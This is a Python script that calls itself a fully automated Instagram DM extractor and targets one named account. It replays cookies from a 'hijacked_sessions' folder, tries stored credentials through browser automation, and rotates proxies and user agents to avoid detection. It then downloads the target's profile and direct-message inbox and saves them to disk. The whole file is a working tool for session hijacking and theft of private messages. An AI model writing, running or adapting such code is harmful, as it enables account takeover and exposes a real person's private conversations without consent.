#!/usr/bin/env python3
"""
Fully Automated Instagram DM Extractor
Handles session acquisition and extraction automatically
"""

import json
import requests
import time
import sys
import random
from pathlib import Path
from datetime import datetime
from playwright.sync_api import sync_playwright
import os

class AutomatedDMExtractor:
    def __init__(self):
        self.correct_username = "alxtrading"  # Fixed username
        self.session = requests.Session()
        self.proxies = self.load_proxies()
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
        ]
        
    def load_proxies(self):
        """Load working proxies from config"""
        proxy_files = [
            "config/working_proxies.json",
            "config/proxy_config.json",
            "config/real_proxy_config.json"
        ]
        
        proxies = []
        for file_path in proxy_files:
            if Path(file_path).exists():
                try:
                    with open(file_path, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, list):
                            proxies.extend(data)
                        elif isinstance(data, dict):
                            if 'proxies' in data:
                                proxies.extend(data['proxies'])
                            elif 'proxy_list' in data:
                                proxies.extend(data['proxy_list'])
                except:
                    continue
        
        print(f"📡 Loaded {len(proxies)} proxy configurations")
        return proxies
    
    def setup_session_with_proxy(self):
        """Setup session with random proxy and user agent"""
        if self.proxies:
            proxy = random.choice(self.proxies)
            if isinstance(proxy, dict) and 'http' in proxy:
                self.session.proxies.update(proxy)
                print(f"🌐 Using proxy: {proxy['http']}")
        
        user_agent = random.choice(self.user_agents)
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        print(f"🔧 Using User-Agent: {user_agent[:50]}...")
    
    def get_automated_session(self):
        """Automatically acquire a fresh session using Playwright"""
        print("🤖 Starting automated session acquisition...")
        
        try:
            with sync_playwright() as p:
                # Use different browser types randomly
                browser_type = random.choice([p.chromium, p.firefox])
                
                browser = browser_type.launch(
                    headless=True,
                    args=[
                        '--no-sandbox',
                        '--disable-dev-shm-usage',
                        '--disable-gpu',
                        '--disable-background-timer-throttling',
                        '--disable-backgrounding-occluded-windows',
                        '--disable-renderer-backgrounding'
                    ]
                )
                
                context = browser.new_context(
                    user_agent=random.choice(self.user_agents),
                    viewport={'width': 1920, 'height': 1080},
                    locale='en-US'
                )
                
                page = context.new_page()
                
                # Navigate to Instagram
                print("📱 Navigating to Instagram...")
                page.goto('https://www.instagram.com/')
                page.wait_for_load_state('networkidle')
                
                # Try multiple login approaches
                session_acquired = False
                
                # Method 1: Try existing cookies from hijacked sessions
                print("🔑 Method 1: Testing existing session cookies...")
                session_acquired = self.try_existing_cookies(page)
                
                # Method 2: Try automated login with known credentials
                if not session_acquired:
                    print("🔑 Method 2: Attempting automated login...")
                    session_acquired = self.try_automated_login(page)
                
                # Method 3: Try session hijacking from browser storage
                if not session_acquired:
                    print("🔑 Method 3: Checking browser storage...")
                    session_acquired = self.try_storage_extraction(page)
                
                if session_acquired:
                    # Extract sessionid from cookies
                    cookies = context.cookies()
                    for cookie in cookies:
                        if cookie['name'] == 'sessionid':
                            sessionid = cookie['value']
                            print(f"✅ Session acquired: {sessionid[:20]}...")
                            
                            # Save for future use
                            session_data = {
                                "sessionid": sessionid,
                                "timestamp": datetime.now().isoformat(),
                                "method": "automated_acquisition",
                                "domain": cookie['domain']
                            }
                            
                            with open("automated_session.json", "w") as f:
                                json.dump(session_data, f, indent=2)
                            
                            browser.close()
                            return sessionid
                
                browser.close()
                
        except Exception as e:
            print(f"❌ Automated session acquisition failed: {e}")
        
        return None
    
    def try_existing_cookies(self, page):
        """Try to use existing session cookies"""
        hijacked_dir = Path("hijacked_sessions")
        if hijacked_dir.exists():
            for session_file in hijacked_dir.glob("*.json"):
                try:
                    with open(session_file, 'r') as f:
                        data = json.load(f)
                        
                    # Extract cookies if available
                    cookies = []
                    if 'cookies' in data:
                        cookies = data['cookies']
                    elif 'sessionid' in data:
                        cookies = [{
                            'name': 'sessionid',
                            'value': data['sessionid'],
                            'domain': '.instagram.com',
                            'path': '/'
                        }]
                    
                    if cookies:
                        # Add cookies to page
                        page.context.add_cookies(cookies)
                        page.reload()
                        page.wait_for_load_state('networkidle')
                        
                        # Check if logged in
                        if self.check_login_status(page):
                            print(f"✅ Using session from: {session_file.name}")
                            return True
                            
                except Exception as e:
                    continue
        
        return False
    
    def try_automated_login(self, page):
        """Try automated login with credentials"""
        # Load credentials from config
        cred_files = [
            "config/config.json",
            "config/master_config.json",
            "config/operational_config.json"
        ]
        
        credentials = []
        for cred_file in cred_files:
            if Path(cred_file).exists():
                try:
                    with open(cred_file, 'r') as f:
                        data = json.load(f)
                        
                    # Extract credentials
                    if 'instagram' in data:
                        ig_data = data['instagram']
                        if 'username' in ig_data and 'password' in ig_data:
                            credentials.append({
                                'username': ig_data['username'],
                                'password': ig_data['password']
                            })
                    elif 'credentials' in data:
                        credentials.extend(data['credentials'])
                        
                except:
                    continue
        
        # Try each credential set
        for cred in credentials:
            try:
                print(f"🔐 Trying login with: {cred['username']}")
                
                # Navigate to login
                page.goto('https://www.instagram.com/accounts/login/')
                page.wait_for_load_state('networkidle')
                
                # Fill login form
                page.fill('input[name="username"]', cred['username'])
                page.fill('input[name="password"]', cred['password'])
                
                # Submit
                page.click('button[type="submit"]')
                page.wait_for_load_state('networkidle')
                
                # Check if login successful
                if self.check_login_status(page):
                    print("✅ Login successful!")
                    return True
                else:
                    print("❌ Login failed")
                    
            except Exception as e:
                print(f"❌ Login attempt failed: {e}")
                continue
        
        return False
    
    def try_storage_extraction(self, page):
        """Try to extract session from browser storage"""
        try:
            # Check localStorage
            local_storage = page.evaluate("() => JSON.stringify(localStorage)")
            if local_storage and 'sessionid' in local_storage:
                return True
                
            # Check sessionStorage  
            session_storage = page.evaluate("() => JSON.stringify(sessionStorage)")
            if session_storage and 'sessionid' in session_storage:
                return True
                
        except:
            pass
        
        return False
    
    def check_login_status(self, page):
        """Check if successfully logged into Instagram"""
        try:
            # Look for elements that indicate logged in state
            selectors = [
                '[data-testid="app-header-more-menu-button"]',
                'a[href="/direct/inbox/"]',
                '[aria-label="New post"]',
                'svg[aria-label="Home"]'
            ]
            
            for selector in selectors:
                if page.locator(selector).count() > 0:
                    return True
                    
            # Also check URL
            current_url = page.url
            if '/accounts/login' not in current_url and 'instagram.com' in current_url:
                return True
                
        except:
            pass
        
        return False
    
    def extract_dms_with_session(self, sessionid):
        """Extract DMs using the acquired session"""
        print(f"🎯 Starting DM extraction for: {self.correct_username}")
        
        self.setup_session_with_proxy()
        self.session.cookies.set('sessionid', sessionid, domain='.instagram.com')
        
        # Add additional required cookies for Instagram API
        required_cookies = {
            'csrftoken': 'missing',
            'mid': f'Y{int(time.time())}-0',
            'ig_did': f'{random.randint(10**17, 10**18-1)}',
            'ig_nrcb': '1',
            'rur': 'VLL'
        }
        
        for name, value in required_cookies.items():
            self.session.cookies.set(name, value, domain='.instagram.com')
        
        try:
            # Get user profile first
            print("📊 Fetching user profile...")
            profile_url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.correct_username}'
            
            headers = {
                'X-IG-App-ID': '936619743392459',
                'X-ASBD-ID': '198387',
                'X-CSRFToken': 'missing',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            profile_response = self.session.get(profile_url, headers=headers, timeout=15)
            
            if profile_response.status_code == 200:
                profile_data = profile_response.json()
                user_id = profile_data['data']['user']['id']
                print(f"✅ Found user ID: {user_id}")
                
                # Get DM threads
                print("💬 Fetching DM threads...")
                dm_url = 'https://www.instagram.com/api/v1/direct_v2/inbox/'
                
                dm_response = self.session.get(dm_url, headers=headers, timeout=15)
                
                result = {
                    "timestamp": datetime.now().isoformat(),
                    "target_username": self.correct_username,
                    "target_user_id": user_id,
                    "extraction_method": "automated_full",
                    "profile_data": profile_data['data']['user'],
                    "extraction_status": "completed"
                }
                
                if dm_response.status_code == 200:
                    dm_data = dm_response.json()
                    result["dm_threads"] = dm_data
                    result["dm_count"] = len(dm_data.get('inbox', {}).get('threads', []))
                    print(f"✅ Found {result['dm_count']} DM threads")
                    
                    # Extract specific conversation if found
                    threads = dm_data.get('inbox', {}).get('threads', [])
                    target_conversation = None
                    
                    for thread in threads:
                        users = thread.get('users', [])
                        for user in users:
                            if user.get('username') == self.correct_username:
                                target_conversation = thread
                                break
                        if target_conversation:
                            break
                    
                    if target_conversation:
                        result["target_conversation"] = target_conversation
                        result["message_count"] = len(target_conversation.get('items', []))
                        print(f"🎯 Found target conversation with {result['message_count']} messages")
                    
                else:
                    result["dm_error"] = f"DM fetch failed: {dm_response.status_code}"
                    result["dm_response"] = dm_response.text[:500]
                    print(f"⚠️ DM fetch returned: {dm_response.status_code}")
                
                # Save comprehensive results
                output_file = f"automated_extraction_{int(time.time())}.json"
                with open(output_file, 'w') as f:
                    json.dump(result, f, indent=2, default=str)
                
                print(f"💾 Results saved to: {output_file}")
                
                # Also save to data directory
                data_dir = Path("data/automated_extraction")
                data_dir.mkdir(parents=True, exist_ok=True)
                
                data_file = data_dir / f"extraction_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(data_file, 'w') as f:
                    json.dump(result, f, indent=2, default=str)
                
                print(f"💾 Also saved to: {data_file}")
                return True
                
            else:
                print(f"❌ Profile fetch failed: {profile_response.status_code}")
                print(f"Response: {profile_response.text[:200]}")
                
        except Exception as e:
            print(f"❌ Extraction error: {e}")
            import traceback
            traceback.print_exc()
        
        return False

def main():
    print("🚀 FULLY AUTOMATED Instagram DM Extractor")
    print("=" * 60)
    print(f"🎯 Target: {AutomatedDMExtractor().correct_username}")
    print("🤖 Mode: Full Automation")
    print("=" * 60)
    
    extractor = AutomatedDMExtractor()
    
    # Step 1: Get session automatically
    print("\n📱 STEP 1: Automated Session Acquisition")
    sessionid = extractor.get_automated_session()
    
    if not sessionid:
        print("⚠️ Automated session acquisition failed, checking existing files...")
        
        # Fallback: check for existing session files
        session_files = [
            "automated_session.json",
            "manual_session.json", 
            "tools/session_alx_trading.json"
        ]
        
        for file_path in session_files:
            if Path(file_path).exists():
                try:
                    with open(file_path, 'r') as f:
                        data = json.load(f)
                        sessionid = data.get('sessionid')
                        if sessionid:
                            print(f"✅ Using session from: {file_path}")
                            break
                except:
                    continue
    
    # Step 2: Extract DMs
    if sessionid:
        print(f"\n💬 STEP 2: DM Extraction")
        success = extractor.extract_dms_with_session(sessionid)
        
        if success:
            print("\n🎉 AUTOMATED EXTRACTION COMPLETED SUCCESSFULLY!")
            print("📁 Check the output files for results")
        else:
            print("\n❌ EXTRACTION FAILED")
            print("💡 Session may be invalid or target has no accessible DMs")
    else:
        print("\n❌ NO VALID SESSION AVAILABLE")
        print("🔧 Please check network connection and try again")

if __name__ == "__main__":
    main()
